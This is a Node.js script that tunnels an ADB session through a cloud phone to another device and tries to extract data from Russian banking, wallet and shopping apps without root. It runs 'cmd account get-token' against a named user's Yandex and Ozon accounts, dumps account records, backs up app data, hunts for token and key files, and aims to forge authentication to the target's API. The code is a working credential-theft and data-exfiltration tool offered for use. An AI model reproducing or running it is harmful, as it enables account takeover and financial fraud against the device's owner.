#!/usr/bin/env node
/**
 * Extract app data from .220 without root:
 * 1. bu backup (Android backup utility) for per-app data
 * 2. cmd account for account tokens
 * 3. content providers for accessible data
 * 4. Binder call to xu_daemon from D1 root (via service call)
 */
const net = require('net');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

const { AK, SK, HOST, D1, D2, CT, SHD } = require('../shared/vmos_api');
const D1_SERIAL = 'localhost:8479';
const D2_SERIAL = 'localhost:7391';
const SRC_IP = '10.0.26.220';
const OUT = path.join(__dirname, '..', 'output', 'clone_220_data');

const APPS = [
  'com.yandex.bank', 'ru.ozon.app.android', 'ru.ozon.fintech.finance',
  'com.wildberries.ru', 'ru.yandex.taxi', 'ru.yoo.money',
  'ru.cupis.wallet', 'ru.apteka', 'ru.getpharma.eapteka',
  'ru.rostel', 'ru.vk.store', 'com.app.trademo', 'com.trademo.massmo',
];

function sign(b) {
  const xd = new Date().toISOString().replace(/[-:]/g, '').replace(/\.\d{3}Z$/, 'Z');
  const sd = xd.slice(0, 8), CT = 'application/json;charset=UTF-8', SHD = 'content-type;host;x-content-sha256;x-date';
  const bh = crypto.createHash('sha256').update(b, 'utf8').digest('hex');
  const can = `host:${HOST}\nx-date:${xd}\ncontent-type:${CT}\nsignedHeaders:${SHD}\nx-content-sha256:${bh}`;
  const ch = crypto.createHash('sha256').update(can, 'utf8').digest('hex');
  const sts = `HMAC-SHA256\n${xd}\n${sd}/armcloud-paas/request\n${ch}`;
  let k = crypto.createHmac('sha256', SK).update(sd).digest();
  k = crypto.createHmac('sha256', k).update('armcloud-paas').digest();
  k = crypto.createHmac('sha256', k).update('request').digest();
  return { 'content-type': CT, 'x-date': xd, 'x-host': HOST, 'authorization': `HMAC-SHA256 Credential=${AK}, SignedHeaders=${SHD}, Signature=${crypto.createHmac('sha256', k).update(sts).digest('hex')}` };
}
function apiPost(ep, d, t) {
  return new Promise(ok => {
    const b = JSON.stringify(d || {}); const h = sign(b); const buf = Buffer.from(b);
    const req = https.request({ hostname: HOST, path: ep, method: 'POST', headers: { ...h, 'content-length': buf.length }, timeout: (t || 60) * 1000 }, res => {
      let r = ''; res.on('data', c => r += c); res.on('end', () => { try { ok(JSON.parse(r)); } catch { ok({ code: -1 }); } });
    });
    req.on('timeout', () => { req.destroy(); ok({ code: -99 }); });
    req.on('error', e => ok({ code: -99, msg: e.message }));
    req.write(buf); req.end();
  });
}

// ADB stream to .220
const A_CNXN=0x4e584e43,A_OPEN=0x4e45504f,A_OKAY=0x59414b4f,A_WRTE=0x45545257,A_CLSE=0x45534c43;
function makeHeader(cmd,a0,a1,dl,dc){const h=Buffer.alloc(24);h.writeUInt32LE(cmd,0);h.writeUInt32LE(a0,4);h.writeUInt32LE(a1,8);h.writeUInt32LE(dl,12);h.writeUInt32LE(dc,16);h.writeUInt32LE((cmd^0xFFFFFFFF)>>>0,20);return h;}
function crc(d){let s=0;for(let i=0;i<d.length;i++)s+=d[i];return s>>>0;}
function makeCnxn(){const p=Buffer.from('host::\x00');return Buffer.concat([makeHeader(A_CNXN,0x01000000,256*1024,p.length,crc(p)),p]);}
function makeOpen(lid,svc){const p=Buffer.from(svc+'\x00');return Buffer.concat([makeHeader(A_OPEN,lid,0,p.length,crc(p)),p]);}
function makeOkay(lid,rid){return makeHeader(A_OKAY,lid,rid,0,0);}
function parsePackets(buf){const pkts=[];let o=0;while(o+24<=buf.length){const cmd=buf.readUInt32LE(o),a0=buf.readUInt32LE(o+4),a1=buf.readUInt32LE(o+8),dl=buf.readUInt32LE(o+12);if(o+24+dl>buf.length)break;pkts.push({cmd,arg0:a0,arg1:a1,data:buf.slice(o+24,o+24+dl)});o+=24+dl;}return{packets:pkts,remaining:buf.slice(o)};}

function adbExec220(cmd, sec) {
  return new Promise(resolve => {
    let trid=null,srid=null,sc=false,done=false,res=Buffer.alloc(0),buf=Buffer.alloc(0),tb=Buffer.alloc(0);
    const sock=net.createConnection(8479,'127.0.0.1',()=>sock.write(makeCnxn()));
    const fin=()=>{if(done)return;done=true;clearTimeout(t);try{sock.destroy();}catch(e){}resolve(res);};
    const t=setTimeout(fin,(sec||30)*1000);
    sock.on('data',chunk=>{buf=Buffer.concat([buf,chunk]);const{packets:pp,remaining:r}=parsePackets(buf);buf=r;
    for(const p of pp){if(p.cmd===A_CNXN&&!trid)sock.write(makeOpen(1,`exec:nc ${SRC_IP} 5555`));
    else if(p.cmd===A_OKAY&&p.arg1===1&&!trid){trid=p.arg0;setTimeout(()=>{const c=makeCnxn();sock.write(Buffer.concat([makeHeader(A_WRTE,1,trid,c.length,crc(c)),c]));},500);}
    else if(p.cmd===A_WRTE&&p.arg1===1){sock.write(makeOkay(1,trid));tb=Buffer.concat([tb,p.data]);const inner=parsePackets(tb);tb=inner.remaining;
    for(const ip of inner.packets){if(ip.cmd===A_CNXN&&!sc){sc=true;const q=Buffer.from('shell:'+cmd+'\x00');const op=Buffer.concat([makeHeader(A_OPEN,100,0,q.length,crc(q)),q]);sock.write(Buffer.concat([makeHeader(A_WRTE,1,trid,op.length,crc(op)),op]));}
    else if(ip.cmd===A_OKAY&&ip.arg1===100)srid=ip.arg0;
    else if(ip.cmd===A_WRTE&&ip.arg1===100){res=Buffer.concat([res,ip.data]);const ok=makeOkay(100,srid);sock.write(Buffer.concat([makeHeader(A_WRTE,1,trid,ok.length,crc(ok)),ok]));}
    else if(ip.cmd===A_CLSE)fin();}}else if(p.cmd===A_CLSE)fin();}});
    sock.on('error',fin);sock.on('close',fin);
  });
}

const log = m => console.log(`[${new Date().toISOString().slice(11,19)}] ${m}`);
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function main() {
  console.log('═'.repeat(60));
  console.log('  EXTRACT .220 DATA — NO-ROOT METHODS');
  console.log('═'.repeat(60));
  fs.mkdirSync(path.join(OUT, 'app_data'), { recursive: true });

  // METHOD 1: Check allowBackup for each app
  log('=== METHOD 1: Check backup eligibility ===');
  const backupCheck = await adbExec220(
    APPS.map(p => `dumpsys package ${p} 2>/dev/null | grep -E "flags=|allowBackup" | head -2; echo PKG:${p}`).join('; '),
    30);
  log(backupCheck.toString().slice(0, 1000));

  // METHOD 2: bu backup per app to /sdcard then base64 stream
  log('\n=== METHOD 2: bu backup to /sdcard ===');
  // First test with a small app
  const testPkg = 'com.app.trademo';
  const backupTest = await adbExec220(
    `bu backup ${testPkg} > /sdcard/backup_test.ab 2>&1; ls -la /sdcard/backup_test.ab 2>&1; echo DONE`,
    30);
  log('bu backup test: ' + backupTest.toString());

  // METHOD 3: cmd account — list accounts with auth tokens
  log('\n=== METHOD 3: Account details ===');
  const acc1 = await adbExec220('dumpsys account 2>&1', 30);
  const accStr = acc1.toString();
  fs.writeFileSync(path.join(OUT, 'app_data', 'full_dumpsys_account.txt'), accStr);
  log('Full dumpsys account: ' + accStr.length + ' bytes saved');
  log(accStr.slice(0, 500));

  // Try to get auth tokens
  log('\nAttempting auth token extraction...');
  const tokens = await adbExec220(
    'cmd account list-accounts 2>&1; echo ---; cmd account get-token ru.ozon.id.authorized.account "OZON ID" 2>&1; echo ---; cmd account get-token com.yandex.passport "Максим Сирож #2042295278 ﹫" 2>&1',
    15);
  log('Token attempt: ' + tokens.toString().slice(0, 500));

  // METHOD 4: Try service call to xu_daemon Binder from D1
  // D1 has root and can reach .220 via network — but Binder is local
  // However, D1 can call its OWN xu_daemon, which could potentially proxy to .220
  log('\n=== METHOD 4: D1 root — service call to xu_daemon ===');
  
  // Check xu_daemon Binder service name on D1
  const svcList = await syncCmd(D1, 'service list 2>/dev/null | grep -i xu', 10);
  log('D1 xu services: ' + svcList);

  // Try calling xu_daemon's executeBatchCommand directly
  const svcCall = await syncCmd(D1, 'service call xu 1 s16 "id" 2>&1', 10);
  log('D1 service call xu: ' + svcCall.slice(0, 200));

  // METHOD 5: Try to call xu_daemon on .220 via binder proxy
  // Since we can reach .220 via network, and xu_daemon's HTTP on .220 is :19090
  // Try to use D1 root to forge proper auth for .220's HTTP API
  log('\n=== METHOD 5: D1 root calls .220 HTTP API ===');

  // First, check what D1's xu_daemon uses for auth with the cloud
  const d1Auth = await syncCmd(D1, 'cat /data/local/tmp/proxy.log 2>/dev/null | tail -20', 10);
  log('D1 proxy.log tail: ' + d1Auth.slice(0, 500));

  // Check for any token/auth files
  const d1Tokens = await syncCmd(D1, 'find /data -name "*.token" -o -name "*auth*" -o -name "*key*" 2>/dev/null | grep -v "app\\|cache" | head -20', 15);
  log('D1 token files: ' + d1Tokens);

  // Try to read .220's proxy.log (100MB file) - might have auth details
  log('\n=== .220 proxy.log analysis ===');
  const proxyHead = await adbExec220('head -50 /data/local/tmp/proxy.log 2>&1', 15);
  log('.220 proxy.log head: ' + proxyHead.toString().slice(0, 500));

  const proxyTail = await adbExec220('tail -50 /data/local/tmp/proxy.log 2>&1', 15);
  log('.220 proxy.log tail: ' + proxyTail.toString().slice(0, 500));

  // METHOD 6: Try adb backup via the ADB protocol itself
  log('\n=== METHOD 6: ADB backup service ===');
  // The "backup:" ADB service triggers adb backup
  const backupSvc = await new Promise(resolve => {
    let trid=null,sc=false,done=false,res=Buffer.alloc(0),buf=Buffer.alloc(0),tb=Buffer.alloc(0);
    const sock=net.createConnection(8479,'127.0.0.1',()=>sock.write(makeCnxn()));
    const fin=()=>{if(done)return;done=true;clearTimeout(timer);try{sock.destroy();}catch(e){}resolve(res);};
    const timer=setTimeout(fin,15000);
    sock.on('data',chunk=>{buf=Buffer.concat([buf,chunk]);const{packets:pp,remaining:r}=parsePackets(buf);buf=r;
    for(const p of pp){
      if(p.cmd===A_CNXN&&!trid)sock.write(makeOpen(1,`exec:nc ${SRC_IP} 5555`));
      else if(p.cmd===A_OKAY&&p.arg1===1&&!trid){
        trid=p.arg0;
        setTimeout(()=>{
          const c=makeCnxn();
          sock.write(Buffer.concat([makeHeader(A_WRTE,1,trid,c.length,crc(c)),c]));
        },500);
      }
      else if(p.cmd===A_WRTE&&p.arg1===1){
        sock.write(makeOkay(1,trid));tb=Buffer.concat([tb,p.data]);const inner=parsePackets(tb);tb=inner.remaining;
        for(const ip of inner.packets){
          if(ip.cmd===A_CNXN&&!sc){
            sc=true;
            // Open backup: service for one small app
            const q=Buffer.from('backup:com.app.trademo\x00');
            const op=Buffer.concat([makeHeader(A_OPEN,100,0,q.length,crc(q)),q]);
            sock.write(Buffer.concat([makeHeader(A_WRTE,1,trid,op.length,crc(op)),op]));
          }
          else if(ip.cmd===A_OKAY&&ip.arg1===100){
            // backup service accepted
            res=Buffer.concat([res,Buffer.from('BACKUP_ACCEPTED ')]);
          }
          else if(ip.cmd===A_WRTE&&ip.arg1===100){
            res=Buffer.concat([res,ip.data]);
            const ok=makeOkay(100,ip.arg0);
            sock.write(Buffer.concat([makeHeader(A_WRTE,1,trid,ok.length,crc(ok)),ok]));
          }
          else if(ip.cmd===A_CLSE){fin();}
        }
      }
      else if(p.cmd===A_CLSE)fin();
    }});
    sock.on('error',fin);sock.on('close',fin);
  });
  log('Backup service result: ' + backupSvc.length + ' bytes');
  if (backupSvc.length > 50) {
    log('First 100 bytes (hex): ' + backupSvc.slice(0, 100).toString('hex'));
    log('First 100 bytes (ascii): ' + backupSvc.slice(0, 100).toString('ascii').replace(/[^\x20-\x7e]/g, '.'));
  }
}

main().catch(e => console.error('FATAL:', e));
